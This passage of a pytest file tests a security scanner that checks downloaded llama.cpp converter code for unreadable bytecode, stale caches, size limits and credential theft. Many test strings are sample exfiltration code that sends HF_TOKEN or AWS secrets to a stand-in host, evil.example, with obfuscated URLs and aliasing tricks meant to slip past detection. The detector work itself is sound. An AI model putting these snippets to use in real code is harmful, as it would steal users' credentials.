    module.write_text("VERSION = 1  # and a payload\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_a_sourceless_module_is_reported_rather_than_skipped(tmp_path, monkeypatch, caplog):
    """Walk took .py only: bytecode and native modules were unseen, yet CPython runs them."""
    llama_cpp = _load("llama_cpp_opaque_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # A .pyc with no source beside it: CPython still imports and runs it as conversion.evil.
    (root / "conversion" / "evil.pyc").write_bytes(b"\x00" * 64)

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("cannot read" in record.message for record in caplog.records), (
        [r.message for r in caplog.records]
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_native_extension_module_is_reported(tmp_path, monkeypatch):
    llama_cpp = _load("llama_cpp_native_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "conversion" / "fast.so").write_bytes(b"\x7fELF" + b"\x00" * 32)

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


@pytest.mark.parametrize(
    "flags",
    [0b00, 0b11, 0b01],
    ids = ["timestamp", "checked hash", "unchecked hash"],
)
def test_every_supplied_cache_with_a_source_is_removed_before_the_converter_runs(
    tmp_path, monkeypatch, caplog, flags
):
    """CPython's header check (mtime and size, or a hash the archive also sets) does not prove
    bytecode came from its source: a timestamp cache imported PWNED while its source read clean,
    so every cache with a source is deleted for Python to rebuild from the scanned .py."""
    llama_cpp = _load(f"llama_cpp_purge_probe_{flags}", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    supplied = cache / "base.cpython-313.pyc"
    supplied.write_bytes(_pyc(flags))

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))     # must not raise

    assert not supplied.exists(), "supplied bytecode survived into the converter run"
    # Ordinary caches are deleted silently: the .py is still there and Python rebuilds them.
    assert caplog.records == [], [r.message for r in caplog.records]


def test_a_cache_that_cannot_be_removed_is_reported(tmp_path, monkeypatch):
    """Read-only tree: a cache that cannot be deleted stays executable and must be reported."""
    llama_cpp = _load("llama_cpp_stuck_cache_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    (cache / "base.cpython-313.pyc").write_bytes(_pyc(0))

    real_remove = os.remove

    def refuse(path, *args, **kwargs):
        if str(path).endswith(".pyc"):
            raise PermissionError(13, "read-only file system", str(path))
        return real_remove(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "remove", refuse)
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_sourceless_cache_is_reported_rather_than_deleted(tmp_path, monkeypatch):
    """Nothing can rebuild this one, so removing it would break a package that
    genuinely ships it. Reporting keeps the scan honest without breaking export."""
    llama_cpp = _load("llama_cpp_sourceless_keep_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    orphan = root / "conversion" / "evil.pyc"
    orphan.write_bytes(_pyc(0))

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))
    assert orphan.exists(), "a cache with no source must not be deleted"


def test_ordinary_bytecode_caches_do_not_push_a_package_over_the_cap(
    tmp_path, monkeypatch, caplog
):
    """Collecting .pyc for the opaque-module check made them count as modules.

    An ordinary export leaves one cache per module behind, so a package of 40
    modules with 25 caches read as 65 files and crossed the 64 cap: a false
    security warning in advisory mode, and under strict mode a refusal of every
    export after the first. This module's whole contract is that a false positive
    which refuses an export is worse than the warning is a win.
    """
    llama_cpp = _load("llama_cpp_cache_count_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    conversion = root / "conversion"
    for index in range(38):                      # 40 source modules in total
        (conversion / f"mod_{index:03d}.py").write_text("V = 1\n", encoding = "utf-8")
    cache = conversion / "__pycache__"
    cache.mkdir()
    for index in range(25):
        (cache / f"mod_{index:03d}.cpython-313.pyc").write_bytes(_pyc(0))

    names = llama_cpp._conversion_package_modules(str(conversion)).names
    assert len(names) == 40, sorted(names)[:5]

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))     # must not raise
    assert caplog.records == [], [r.message for r in caplog.records]


def test_a_pyc_beside_its_own_source_is_not_a_module_of_its_own(tmp_path):
    """Legacy layout: with base.py present, base.pyc is not what gets imported."""
    llama_cpp = _load("llama_cpp_sibling_pyc_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "conversion" / "base.pyc").write_bytes(_pyc(0))

    names = llama_cpp._conversion_package_modules(str(root / "conversion")).names
    assert sorted(names) == ["__init__.py", "base.py"], sorted(names)


def test_one_wide_directory_cannot_outrun_the_entry_budget(tmp_path, monkeypatch):
    """os.walk returns a directory's names all at once, so one wide directory was listed in full
    before the entry budget applied; streaming the directory makes the budget real."""
    llama_cpp = _load("llama_cpp_wide_dir_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    entries = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 3
    for index in range(entries):
        (conversion / f"blob_{index:05d}.bin").write_bytes(b"")

    seen = []
    real_scandir = os.scandir

    class _CountingScandir:
        def __init__(self, path):
            self._inner = real_scandir(path)

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self._inner.close()
            return False

        def __iter__(self):
            for entry in self._inner:
                seen.append(entry.name)
                yield entry

    monkeypatch.setattr(llama_cpp.os, "scandir", _CountingScandir)
    walk = llama_cpp._conversion_package_modules(
        str(conversion),
        file_limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1,
        entry_limit = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 1,
    )
    names, complete = walk.names, walk.complete

    assert complete is False
    # Bound is on entries TOUCHED: one past the limit is needed to know it was crossed.
    assert len(seen) <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 1, (
        f"touched {len(seen)} of {entries} entries in one directory"
    )
    assert len(names) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES


@pytest.mark.parametrize("over", [0, 1], ids = ["exactly at the limit", "one past it"])
def test_a_package_at_exactly_the_entry_limit_is_not_called_oversized(
    tmp_path, monkeypatch, caplog, over
):
    """Stopping AT the entry limit reported a package of exactly that many entries as oversized and
    refused it under strict mode; the entry budget must ask for one extra, as the file cap does."""
    llama_cpp = _load(f"llama_cpp_entry_edge_probe_{over}", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    (conversion / "base.py").write_text("Y = 1\n", encoding = "utf-8")
    # Two modules already, so pad to exactly the limit (or one past it).
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES - 2 + over):
        (conversion / f"blob_{index:05d}.bin").write_bytes(b"")

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    if over:
        with pytest.raises(llama_cpp.ConverterScanError, match = "directory entries"):
            llama_cpp._scan_conversion_package(str(root))
    else:
        with caplog.at_level(logging.WARNING):
            llama_cpp._scan_conversion_package(str(root))      # must not raise
        assert caplog.records == [], [r.message for r in caplog.records]


def test_no_single_module_is_read_whole(tmp_path, monkeypatch, caplog):
    """The cache key and the scan must not read a module whole: one huge or sparse module would be
    allocated before any size finding, so both reads are bounded and oversized modules are
    reported."""
    llama_cpp = _load("llama_cpp_big_module_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    big = root / "conversion" / "huge.py"
    with open(big, "wb") as handle:
        handle.truncate(llama_cpp.MAX_MODULE_BYTES * 4)      # sparse, costs no disk

    largest = []
    real_open = open

    def watching_open(path, *args, **kwargs):
        handle = real_open(path, *args, **kwargs)
        if str(path) == str(big):
            real_read = handle.read

            def read(size = -1):
                data = real_read(size)
                largest.append(len(data))
                return data

            handle.read = read
        return handle

    monkeypatch.setattr("builtins.open", watching_open)
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._conversion_sibling_info(str(root))
        llama_cpp._scan_conversion_package(str(root))

    assert largest, "the oversized module was never opened"
    assert max(largest) <= llama_cpp.MAX_MODULE_BYTES + 1, max(largest)
    assert any("larger than" in record.message for record in caplog.records), (
        [r.message for r in caplog.records]
    )


def test_the_cache_key_still_moves_when_an_oversized_module_changes(tmp_path):
    """Hashing only a prefix must not make a big module's edits invisible, so the
    size travels beside the digest."""
    llama_cpp = _load("llama_cpp_big_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    big = root / "conversion" / "huge.py"
    with open(big, "wb") as handle:
        handle.truncate(llama_cpp.MAX_MODULE_BYTES * 2)

    before = llama_cpp._conversion_sibling_info(str(root))
    with open(big, "wb") as handle:
        handle.truncate(llama_cpp.MAX_MODULE_BYTES * 2 + 1)
    assert llama_cpp._conversion_sibling_info(str(root)) != before

    # And a change inside the part that is read moves it too.
    after_growth = llama_cpp._conversion_sibling_info(str(root))
    with open(big, "r+b") as handle:
        handle.write(b"import os  # payload\n")
    assert llama_cpp._conversion_sibling_info(str(root)) != after_growth


def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch, caplog):
    """The other half: the report must not fire on an ordinary package."""
    llama_cpp = _load("llama_cpp_cap_ok_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES):
        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert not [r for r in caplog.records if "more than the" in r.message]


def test_a_prebuilt_marker_does_not_buy_the_exemption(tmp_path, monkeypatch):
    """UNSLOTH_PREBUILT_INFO.json reads like proof of verification and is not.

    _stage_prebuilt_install checks a sha256 for the BINARY asset, and only when
    the release published one. The converter itself arrives separately through
    _hydrate_converter_sources, which downloads a source tarball with no digest
    at all, and the marker is written after that. So a replaced source tarball
    wore a "verified" marker, took the strict-mode exemption and skipped the
    conversion/ scan with it. The converter from a prebuilt bundle is a download
    like any other and is scanned like one.
    """
    llama_cpp = _load("llama_cpp_marker_probe", "unsloth_zoo/llama_cpp.py")

    bundle = tmp_path / "prebuilt"
    bundle.mkdir()
    script = bundle / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")
    (bundle / llama_cpp.UNSLOTH_PREBUILT_INFO_FILENAME).write_text("{}")

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    assert llama_cpp._converter_is_trusted_local(str(script)) is False, (
        "the marker does not say these converter bytes were verified"
    )


def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
    """_resolve_local_convert_script accepts the pin after expanduser, so this check must expand it
    too, or a pinned converter with a finding is refused as downloaded under strict mode."""
    llama_cpp = _load("llama_cpp_tilde_probe", "unsloth_zoo/llama_cpp.py")

    home = tmp_path / "home"
    pinned = home / "llama.cpp"
    pinned.mkdir(parents = True)
    script = pinned / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")

    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", "~/llama.cpp")
    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
        "an unexpanded pin compared unequal to the expanded script path"
    )


def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
    """Upstream's gguf-py/gguf/utility.py reads HF_TOKEN and sends it to huggingface.co as an
    Authorization header, which is a gated model download; it must not be a finding."""
    scan_converter_source = _load(
        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub_only = (
        'import os\n'
        'import requests\n'
        'BASE_DOMAIN = "https://huggingface.co"\n'
        'def _headers():\n'
        '    headers = {}\n'
        '    if os.environ.get("HF_TOKEN"):\n'
        '        headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
        '    return headers\n'
        'def fetch(url):\n'
        '    return requests.get(url, allow_redirects=True, headers=_headers())\n'
    )
    assert [f.check for f in scan_converter_source(hub_only)] == []

    # A second destination is the whole difference, and it is still caught.
    with_exfil = hub_only.replace(
        'BASE_DOMAIN = "https://huggingface.co"\n',
        'BASE_DOMAIN = "https://huggingface.co"\nEXFIL = "https://evil.example.com/c"\n',
    )
    assert any(
        "Harvests environment variables" in f.check
        for f in scan_converter_source(with_exfil)
    ), [f.check for f in scan_converter_source(with_exfil)]

    # No host named is no pass: suppression needs a named hub host, else the finding stays.
    no_host = (
        'import os\n'
        'import requests\n'
        'requests.post(HOST, data = {"t": os.environ["HF_TOKEN"]})\n'
    )
    assert any(
        "Harvests environment variables" in f.check
        for f in scan_converter_source(no_host)
    )

    # A file this cannot parse is not suppressed either.
    unparseable = hub_only + "def (\n"
    assert any(
        "Harvests environment variables" in f.check
        for f in scan_converter_source(unparseable)
    )


def test_a_host_based_network_api_refuses_the_hub_allowance():
    """The hub allowance reads URLs, but socket.create_connection and http.client.HTTPSConnection
    take a bare host, so a hub URL beside one of them must not earn the allowance."""
    scan_converter_source = _load(
        "converter_scan_host_api_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub = 'HUB = "https://huggingface.co"\n'
    for body in (
        'import os\nimport socket\n' + hub
        + 'socket.create_connection(("evil.example", 443))'
        + '.send(os.environ["HF_TOKEN"].encode())\n',
        'import os\nimport http.client\n' + hub
        + 'c = http.client.HTTPSConnection("evil.example")\n'
        + 'c.request("POST", "/", os.environ["HF_TOKEN"])\n',
        'import os\nimport socket\n' + hub
        + 's = socket.socket()\ns.connect(("evil.example", 443))\n'
        + 's.send(os.environ["HF_TOKEN"].encode())\n',
        # http.server names no destination: it serves the token to whoever connects.
        'import os\nimport requests\n' + hub
        + 'url = bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65").decode()\n'
        + 'requests.get(url + os.environ["HF_TOKEN"])\n',
        'import os\nimport requests\nimport base64\n' + hub
        + 'url = base64.b64decode("aHR0cHM6Ly9ldmlsLmV4YW1wbGU=").decode()\n'
        + 'requests.get(url + os.environ["HF_TOKEN"])\n',
        'import os\nimport requests\n' + hub
        + 'tbl = str.maketrans("XY", "hp")\n'
        + 'requests.get("XttXs://Yvil.example/c".translate(tbl) + os.environ["HF_TOKEN"])\n',
        'import os\nimport requests\nimport codecs\n' + hub
        + 'requests.get(codecs.decode("uggcf://rivy.rknzcyr/p", "rot13")'
        + ' + os.environ["HF_TOKEN"])\n',
        # Percent-decoding builds a URL too, with no scheme literal for the walk to find.
        'import os\nimport requests\nfrom urllib.parse import unquote\n' + hub
        + 'url = unquote("https%3A%2F%2Fevil.example%2Fcollect")\n'
        + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n',
        # An aliased import leaves only s.create_connection, which is not recognised either.
        'import os\nimport requests\nimport socket as s\n' + hub
        + 'requests.get(HUB)\n'
        + 'c = s.create_connection(("evil.example", 443))\n'
        + 'c.sendall(os.environ["HF_TOKEN"].encode())\n',
        # A from-import leaves nothing for a qualified-name pattern to match.
        'import os\nimport requests\nfrom socket import create_connection\n' + hub
        + 'requests.get(HUB)\n'
        + 's = create_connection(("evil.example", 443))\n'
        + 's.sendall(os.environ["HF_TOKEN"].encode())\n',
        'import os\nimport http.server\n' + hub
        + 'class H(http.server.BaseHTTPRequestHandler):\n'
        + '    def do_GET(self):\n'
        + '        self.send_header("X-Token", os.environ["HF_TOKEN"])\n',
    ):
        assert any(
            "Harvests environment variables" in f.check
            for f in scan_converter_source(body)
        ), body

    # urlparse is not in that list and must not be: upstream's utility.py parses
    # URLs with it, and parsing one is not building one.
    assert scan_converter_source(
        'import os\nimport requests\nfrom urllib.parse import urlparse\n' + hub
        + 'assert urlparse(HUB).scheme == "https"\n'
        + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    ) == []

    # The URL-based shape the allowance is for still passes.
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    ) == []

    # Decoding what came back is upstream's own shape and must not be refused:
    # gguf-py/gguf/utility.py decodes metadata_bytes off the download as utf-8.
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'r = requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
        + 'text = r.content[8:].decode("utf-8")\n'
    ) == []


def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
    """The hub is writable and multi-tenant, so a destination that is the hub is no reason to stay
    silent: a write-scoped token can create a public repo anyone reads back as a channel."""
    scan_converter_source = _load(
        "converter_scan_shape_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    hub = 'HUB = "https://huggingface.co/api/models"\n'

    def _findings(body):
        return [
            f.check
            for f in scan_converter_source('import os\nimport requests\n' + hub + body)
        ]

    # Sending to the hub is not downloading from it.
    assert _findings('requests.post(HUB, data = os.environ["AWS_SECRET_ACCESS_KEY"])\n')
    assert _findings('requests.post(HUB, data = os.environ["HF_TOKEN"])\n')
    # Any secret other than the hub's own token must not go to the hub, whatever its name: keyword
    # filtering let GITHUB_PAT through, so sending it produced no finding.
    assert _findings(
        'requests.get(HUB, headers = {"a": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
    )
    assert _findings(
        'requests.get(HUB, headers = {\n'
        '    "Authorization": os.environ["HF_TOKEN"],\n'
        '    "x": os.environ["GITHUB_PAT"],\n'
        '})\n'
    )
    assert _findings(
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
        '    timeout = int(os.environ["HTTP_TIMEOUT"]),\n'
        ')\n'
    )
    # The other spellings of the hub's own token are still the hub's own token.
    assert _findings(
        'requests.get(HUB, headers = {"a": os.environ["HUGGING_FACE_HUB_TOKEN"]})\n'
    ) == []
    # Nor does the whole environment.
    assert _findings('requests.get(HUB, params = dict(os.environ))\n')
    assert _findings(
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
        '    params = dict(os.environ),\n'
        ')\n'
    )
    assert _findings(
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
        '    params = os.environ.copy(),\n'
        ')\n'
    )
    # httpx writes count as sinks, and so do writes through a session or client under any name:
    # matching receivers spelled "session" or "client" missed s = requests.Session(); s.post(...).
    for extra in (
        'import os\nimport httpx\n' + hub
        + 'httpx.post(HUB, data = os.environ["HF_TOKEN"])\n',
        'import os\nimport requests\n' + hub
        + 's = requests.Session()\ns.post(HUB, data = os.environ["HF_TOKEN"])\n',
        'import os\nimport httpx\n' + hub
        + 'c = httpx.Client()\nc.put(HUB, data = os.environ["HF_TOKEN"])\n',
    ):
        assert [f.check for f in scan_converter_source(extra)], extra

    # A read whose variable is chosen at runtime cannot be attributed to the hub's token, and must
    # not pass by leaving the collected set empty.
    assert _findings(
        'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
        'requests.get(HUB, headers = {"a": os.environ[SECRET]})\n'
    )
    assert _findings(
        'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
        'requests.get(HUB, headers = {"a": os.environ.get(SECRET)})\n'
    )
    # Beside a legitimate hub token, a dynamic read is refused only by the dynamic check.
    assert _findings(
        'requests.get(HUB, headers = {\n'
        '    "Authorization": os.environ["HF_TOKEN"],\n'
        '    "x": os.environ[OTHER],\n'
        '})\n'
    )
    # A harvest with no secret-looking name is refused, since nothing can say what was read and an
    # empty set cannot be attributed to the hub.
    assert _findings(
        'home = os.environ["HOME"]  # not a TOKEN\n'
        'requests.get(HUB, headers = {"a": home})\n'
    )
    # session.request("POST", ...) is a write the named methods miss; only .get() accounts for
    # os.environ, or .values() and .pop() slip through.
    assert _findings(
        's = requests.Session()\n'
        's.request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
    )
    # A prepared request carries its method in an argument, not the call name, so Session.send() is
    # a write neither named methods nor .request() cover.
    assert _findings(
        's = requests.Session()\n'
        'r = requests.Request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
        's.send(r.prepare())\n'
    )
    assert _findings(
        'requests.get(HUB, params = {\n'
        '    "a": os.environ["HF_TOKEN"],\n'
        '    "b": list(os.environ.values()),\n'
        '})\n'
    )
    assert _findings(
        'requests.get(HUB, params = {\n'
        '    "a": os.environ["HF_TOKEN"],\n'
        '    "b": os.environ.pop("AWS_SECRET_ACCESS_KEY"),\n'
        '})\n'
    )

    # An os.environ that is passed around rather than subscripted here reads
    # credentials this never sees: env = os.environ then env["AWS_..."] left a
    # short name set that satisfied the allow-list.
    assert _findings(
        'env = os.environ\n'
        't = os.environ["HF_TOKEN"]\n'
        'requests.get(HUB, headers = {"a": t, "b": env["AWS_SECRET_ACCESS_KEY"]})\n'
    )
    assert _findings(
        'def f(e):\n'
        '    return e["AWS_SECRET_ACCESS_KEY"]\n'
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"a": os.environ["HF_TOKEN"], "b": f(os.environ)},\n'
        ')\n'
    )

    # An empty collected set is still refused: os.environ reached through an unread call.
    assert _findings(
        'os.environ.setdefault("HF_HOME", "/tmp")  # TOKEN\n'
        'requests.get(HUB)\n'
    )

    # And only os.environ counts as the environment.
    assert _findings(
        'config = {}\n'
        'k = config.get("API_KEY")\n'
        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    ) == []
    assert _findings(
        'requests.get(HUB, headers = {"a": os.getenv("HF_TOKEN")})\n'
    ) == []

    # The shape upstream has: a hub token, sent as authentication, on a read.
    assert _findings(
        'requests.get(HUB, headers = {"Authorization": "Bearer " + os.environ["HF_TOKEN"]})\n'
    ) == []
    assert _findings(
        'requests.head(HUB, headers = {"Authorization": os.environ.get("HF_TOKEN")})\n'
    ) == []


def test_a_write_or_an_environment_read_under_another_name_refuses_it():
    """One rename was enough to walk past both checks."""
    scan_converter_source = _load(
        "converter_scan_alias_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub = 'HUB = "https://huggingface.co"\n'
    for body in (
        'import os\nimport requests\n' + hub
        + 'post = requests.post\npost(HUB, data = os.environ["HF_TOKEN"])\n',
        # httpx takes the method as an argument, so stream is a write the named methods miss.
        'import os\nimport httpx\n' + hub
        + 'c = httpx.Client()\n'
        + 'c.stream("POST", HUB, content = os.environ["HF_TOKEN"])\n',
        'import os\nimport requests\n' + hub
        + 'getenv = os.getenv\n'
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
        + ' "b": getenv("AWS_SECRET_ACCESS_KEY")})\n',
        'import os\nimport requests\nfrom os import getenv\n' + hub
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
        + ' "b": getenv("AWS_SECRET_ACCESS_KEY")})\n',
        'import os\nimport requests\nfrom os import environ\n' + hub
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
        + ' "b": environ["AWS_SECRET_ACCESS_KEY"]})\n',
        'import os\nimport requests\nfrom os import environ as e\n' + hub
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
        + ' "b": e["AWS_SECRET_ACCESS_KEY"]})\n',
        # An alias keeps no reserved spelling, so the name it lands under says nothing.
        'import os\nimport requests\n' + hub
        + 'read_secret = os.getenv\n'
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
        + ' "b": read_secret("AWS_SECRET_ACCESS_KEY")})\n',
        # And a folded one is the same name spelled to miss a Constant check.
        'import os\nimport requests\n' + hub
        + 'other = vars(os)["en" + "viron"]["AWS_SECRET_ACCESS_KEY"]\n'
        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
        + ' "b": other})\n',
        # A module dictionary leaves the name as a string only, as for the write methods.
        'import os\nimport requests\n' + hub
        + 'other = vars(os)["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
        + ' "b": other})\n',
        'import os\nimport requests\n' + hub
        + 'other = os.__dict__["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
        + ' "b": other})\n',
        # Renamed modules (import os as o) say nothing about what their .getenv reads.
        'import os\nimport os as o\nimport requests\n' + hub
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
        + ' "b": o.getenv("AWS_SECRET_ACCESS_KEY")})\n',
        'import os\nimport requests\n' + hub
        + 'requests.get(HUB)\n'
        + 'f = vars(requests)["po" + "st"]\n'
        + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
        # A module dictionary leaves the method name as a string and nothing else.
        'import os\nimport requests\n' + hub
        + 'requests.get(HUB)\n'
        + 'f = vars(requests)["post"]\n'
        + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
        'import os\nimport requests\n' + hub
        + 'requests.get(HUB)\n'
        + 'f = requests.__dict__["post"]\n'
        + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
        # getattr holds neither an Attribute nor a Name spelled post.
        'import os\nimport requests\n' + hub
        + 'f = getattr(requests, "post")\n'
        + 'requests.get(HUB)\n'
        + 'f("https://huggingface.co/api/repos/create",'
        + ' data = os.environ["HF_TOKEN"])\n',
        # A computed name on one of these modules is a lookup this cannot read at all.
        'import os\nimport requests\n' + hub
        + 'name = "environ"\n'
        + 'env = getattr(os, name)\n'
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
        + ' "b": env["AWS_SECRET_ACCESS_KEY"]})\n',
    ):
        assert any(
            "Harvests environment variables" in f.check
            for f in scan_converter_source(body)
        ), body

    # os.environ and os.getenv are attributes, not bare names; upstream's shape reads both.
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'headers = {}\n'
        + 'if os.environ.get("HF_TOKEN"):\n'
        + '    headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
        + 'requests.get(HUB, headers = headers)\n'
    ) == []
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'if os.getenv("HF_TOKEN"):\n'
        + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
    ) == []

    # The key can be a keyword.
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'if os.environ.get(key = "HF_TOKEN"):\n'
        + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
    ) == []
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\n' + hub
            + 'other = os.environ.get(key = "AWS_SECRET_ACCESS_KEY")\n'
            + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
            + ' "b": other})\n'
        )
    ]
    # Computed getattr on the file's own objects is upstream's shape and must stay readable.
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'class Reader:\n'
        + '    def read(self, name):\n'
        + '        return getattr(self, name)\n'
        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
    ) == []


def test_an_oversized_join_is_not_folded():
    """A join multiplies, unlike + and %, whose result is bounded by the source that spells it."""
    module = _load("converter_scan_join_size_probe", "unsloth_zoo/converter_scan.py")
    separator = "A" * 100_000
    elements = ",".join(['""'] * 10_000)
    preamble = (
        'import os\n'
        'import requests\n'
        'HUB = "https://huggingface.co"\n'
        'token = os.environ["HF_TOKEN"]\n'
    )
    started = time.perf_counter()
    module.scan_converter_source(
        preamble + f'X = "{separator}".join([{elements}])\n'
